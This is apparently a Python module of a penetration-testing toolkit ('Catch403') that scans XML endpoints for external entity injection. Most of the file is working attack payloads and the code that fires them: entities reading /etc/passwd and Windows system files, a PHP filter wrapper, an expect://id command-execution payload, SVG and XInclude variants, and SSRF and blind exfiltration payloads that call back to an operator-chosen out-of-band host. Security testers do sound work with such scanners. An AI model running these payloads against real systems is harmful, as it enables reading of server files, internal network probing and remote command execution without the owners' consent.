#!/usr/bin/python3
"""
XXE Scanner — XML External Entity Injection.

Tests XML input endpoints for XXE vulnerabilities. Covers:
  - Classic file-read XXE (file:///etc/passwd)
  - OOB (out-of-band) XXE via HTTP callback
  - Blind XXE via error-based detection
  - SSRF via XXE (http:// external entities)
  - DOCTYPE injection into existing XML payloads
  - SVG / XLSX / PDF upload points that accept XML
  - XXE via JSON-to-XML conversion endpoints
  - Parameter entities (blind exfil via DNS/HTTP)

Usage:
  ../.venv/bin/python3 modules/xxe_scanner.py -u https://target.com/api/parse -d '<root/>'
  ../.venv/bin/python3 modules/xxe_scanner.py -u https://target.com/upload --svg
  ../.venv/bin/python3 modules/xxe_scanner.py -u https://target.com/api -d '<user/>' --oob your.interact.sh
"""
import argparse
import json
import re
import urllib.parse

import requests
import urllib3

from core.colors import bold, end, good, bad, info, run
from core.auth_gate import preflight

urllib3.disable_warnings()

TIMEOUT = 20
UA      = {"User-Agent": "Catch403/1.0"}

# ── payload templates ─────────────────────────────────────────────────────

# Markers we look for to confirm file read
_FILE_MARKERS = [
    r"root:[x*]:0:0:",     # /etc/passwd
    r"\[extensions\]",     # /etc/shadow or win hosts
    r"127\.0\.0\.1",       # /etc/hosts or boot.ini
    r"WINDOWS",            # C:/windows/win.ini
    r"\[fonts\]",          # win.ini
    r"boot loader",        # boot.ini
]
_FILE_RE = re.compile("|".join(_FILE_MARKERS), re.IGNORECASE)

_OOB_RE = re.compile(r"xxe-probe|catch403", re.IGNORECASE)

# Classic in-band XXE payloads
_CLASSIC_PAYLOADS: list[tuple[str, str, str]] = [
    # (label, payload, file_to_read)
    (
        "Linux /etc/passwd",
        '<?xml version="1.0"?><!DOCTYPE x[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
        "/etc/passwd",
    ),
    (
        "Linux /etc/hosts",
        '<?xml version="1.0"?><!DOCTYPE x[<!ENTITY xxe SYSTEM "file:///etc/hosts">]><x>&xxe;</x>',
        "/etc/hosts",
    ),
    (
        "Windows win.ini",
        '<?xml version="1.0"?><!DOCTYPE x[<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><x>&xxe;</x>',
        "C:/windows/win.ini",
    ),
    (
        "Windows boot.ini",
        '<?xml version="1.0"?><!DOCTYPE x[<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><x>&xxe;</x>',
        "C:/boot.ini",
    ),
    (
        "PHP wrapper base64",
        '<?xml version="1.0"?><!DOCTYPE x[<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><x>&xxe;</x>',
        "/etc/passwd (PHP wrapper)",
    ),
    (
        "Expect RCE (PHP)",
        '<?xml version="1.0"?><!DOCTYPE x[<!ENTITY xxe SYSTEM "expect://id">]><x>&xxe;</x>',
        "RCE via expect://",
    ),
]

# SSRF via XXE — fetch an external URL
_SSRF_PAYLOAD = (
    'SSRF via XXE',
    '<?xml version="1.0"?><!DOCTYPE x[<!ENTITY ssrf SYSTEM "http://{oob}/xxe-ssrf">]><x>&ssrf;</x>',
)

# Blind XXE — parameter entity exfiltration via DNS/HTTP
_BLIND_OOB_PAYLOAD = (
    'Blind OOB via parameter entity',
    """<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://{oob}/xxe.dtd">
  %dtd;
]>
<x>&send;</x>""",
)

# Error-based blind XXE
_ERROR_PAYLOAD = (
    'Error-based blind XXE',
    '<?xml version="1.0"?><!DOCTYPE x[<!ENTITY xxe SYSTEM "file:///nonexistent/xxe-error-catch403">]><x>&xxe;</x>',
)

_ERROR_MARKERS = [
    r"java\.io\.FileNotFoundException",
    r"java\.net\.MalformedURLException",
    r"com\.sun\.org\.apache\.xerces",
    r"org\.xml\.sax\.SAXParseException",
    r"System\.Xml\.XmlException",
    r"lxml",
    r"expat",
    r"xml\.etree",
    r"Failed to open stream",
    r"No such file",
    r"nonexistent.*xxe-error",
]
_ERROR_RE = re.compile("|".join(_ERROR_MARKERS), re.IGNORECASE)

# SVG XXE template
_SVG_XXE = """<?xml version="1.0" standalone="yes"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text x="10" y="20">&xxe;</text>
</svg>"""

# XInclude injection (when we can't control DOCTYPE)
_XINCLUDE_PAYLOAD = """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>"""

# Common content types for XML endpoints
_XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/xhtml+xml",
    "application/soap+xml",
]


# ── helpers ───────────────────────────────────────────────────────────────

def _post_xml(url: str, body: str, headers: dict,
              content_type: str = "application/xml") -> requests.Response | None:
    try:
        hdrs = {**headers, "Content-Type": content_type}
        return requests.post(url, data=body.encode(), headers=hdrs,
                             timeout=TIMEOUT, verify=False, allow_redirects=True)
    except Exception:
        return None


def _detect_file_read(r: requests.Response | None, label: str,
                      payload: str) -> dict | None:
    if r is None:
        return None
    if _FILE_RE.search(r.text):
        return {
            "name": f"XXE File Read — {label}",
            "severity": "critical",
            "detail": (
                f"Server returned contents of system file via XML External Entity.\n"
                f"Payload: {payload[:120]}\n"
                f"Evidence: {r.text[:200]}"
            ),
            "payload": payload,
            "evidence": r.text[:500],
        }
    if _ERROR_RE.search(r.text):
        return {
            "name": "XXE Error Disclosure",
            "severity": "medium",
            "detail": (
                f"XML parser error reveals backend XML library and configuration.\n"
                f"Evidence: {r.text[:200]}"
            ),
            "payload": payload,
            "evidence": r.text[:300],
        }
    return None


# ── scan functions ─────────────────────────────────────────────────────────

def scan_endpoint(url: str, base_body: str = "", *,
                  headers: dict | None = None,
                  oob_host: str = "",
                  test_svg: bool = False,
                  test_xinclude: bool = True) -> list[dict]:
    hdrs = {**UA, **(headers or {})}
    findings: list[dict] = []

    # Try each classic payload across each XML content type
    for label, payload, file_hint in _CLASSIC_PAYLOADS:
        for ct in _XML_CONTENT_TYPES:
            r = _post_xml(url, payload, hdrs, ct)
            finding = _detect_file_read(r, label, payload)
            if finding:
                finding["url"] = url
                finding["http_request"] = f"POST {url} HTTP/1.1\nContent-Type: {ct}\n\n{payload[:200]}"
                finding["curl"] = f"curl -sk -X POST '{url}' -H 'Content-Type: {ct}' -d '{payload[:80]}...'"
                findings.append(finding)
                break  # no need to try all content types once found

    # XInclude injection
    if test_xinclude:
        r = _post_xml(url, _XINCLUDE_PAYLOAD, hdrs)
        finding = _detect_file_read(r, "XInclude file read", _XINCLUDE_PAYLOAD)
        if finding:
            finding["url"] = url
            findings.append(finding)

    # Error-based blind detection
    err_label, err_payload = _ERROR_PAYLOAD
    r = _post_xml(url, err_payload, hdrs)
    if r and _ERROR_RE.search(r.text):
        findings.append({
            "name": "XXE — Error-Based Detection",
            "severity": "high",
            "detail": (
                "XML parser error confirms XXE processing. "
                "Blind file exfiltration likely possible.\n"
                f"Evidence: {r.text[:200]}"
            ),
            "url": url,
            "payload": err_payload,
            "evidence": r.text[:300],
        })

    # OOB probes
    if oob_host:
        # SSRF probe
        ssrf_label, ssrf_tmpl = _SSRF_PAYLOAD
        ssrf_payload = ssrf_tmpl.format(oob=oob_host)
        r = _post_xml(url, ssrf_payload, hdrs)
        findings.append({
            "name": "XXE OOB SSRF Probe",
            "severity": "info",
            "detail": (
                f"OOB callback sent to {oob_host} via XML SSRF entity. "
                f"Check your interactsh/collaborator for HTTP request. "
                f"Status: {r.status_code if r else 'timeout'}"
            ),
            "url": url,
            "payload": ssrf_payload,
        })

        # Blind exfil probe
        blind_label, blind_tmpl = _BLIND_OOB_PAYLOAD
        blind_payload = blind_tmpl.format(oob=oob_host)
        r = _post_xml(url, blind_payload, hdrs)
        findings.append({
            "name": "XXE Blind Exfil Probe (Parameter Entity)",
            "severity": "info",
            "detail": (
                f"Parameter entity OOB payload sent. If {oob_host} receives a DNS/HTTP "
                f"request for xxe.dtd, the endpoint processes external entities. "
                f"Status: {r.status_code if r else 'timeout'}"
            ),
            "url": url,
            "payload": blind_payload,
        })

    # SVG upload test
    if test_svg:
        r_svg = _post_xml(url, _SVG_XXE, hdrs, "image/svg+xml")
        if r_svg:
            finding = _detect_file_read(r_svg, "SVG upload XXE", _SVG_XXE)
            if finding:
                finding["url"] = url
                findings.append(finding)

    if not findings:
        findings.append({
            "name": "No XXE Detected",
            "severity": "info",
            "detail": "No XXE indicators found — endpoint may sanitise DOCTYPE or use safe XML library",
        })
    return findings


def scan(url: str, body: str = "", *,
         headers: dict | None = None,
         oob_host: str = "",
         test_svg: bool = False) -> list[dict]:
    return scan_endpoint(url, body, headers=headers,
                         oob_host=oob_host, test_svg=test_svg)


# ── CLI ───────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Catch403 XXE Scanner")
    parser.add_argument("-u", dest="url", required=True,
                        help="Target URL (XML-accepting endpoint)")
    parser.add_argument("-d", dest="body", default="",
                        help="Base XML body (to replace DOCTYPE into)")
    parser.add_argument("--oob", dest="oob_host", default="",
                        help="OOB host for blind XXE (e.g. your.interact.sh)")
    parser.add_argument("--svg",       action="store_true",
                        help="Also test SVG upload XXE")
    parser.add_argument("--header", dest="headers", action="append", default=[],
                        metavar="NAME:VALUE")
    parser.add_argument("-o", dest="output", default="")
    args = parser.parse_args()

    preflight('xxe_scanner', args.url, active=True)

    custom_headers: dict = {}
    for h in args.headers:
        if ":" in h:
            k, v = h.split(":", 1)
            custom_headers[k.strip()] = v.strip()

    _p = urllib.parse.urlparse(args.url)
    print(f"{run} XXE scan: {bold}{_p.netloc}{_p.path}{end}")

    results = scan(
        args.url, args.body,
        headers=custom_headers,
        oob_host=args.oob_host,
        test_svg=args.svg,
    )

    for f in results:
        sev = f.get("severity", "info")
        icon = bad if sev == "critical" else (f"{bold}[{sev.upper()}]{end}" if sev != "info" else info)
        print(f"\n{icon} {bold}{f['name']}{end}")
        print(f"      {f.get('detail', '')[:160]}")
        if f.get("evidence"):
            print(f"      Evidence: {f['evidence'][:80]}")

    if args.output:
        with open(args.output, "w") as fh:
            json.dump(results, fh, indent=2)
        print(f"\n{good} Saved to {args.output}")


if __name__ == "__main__":
    main()
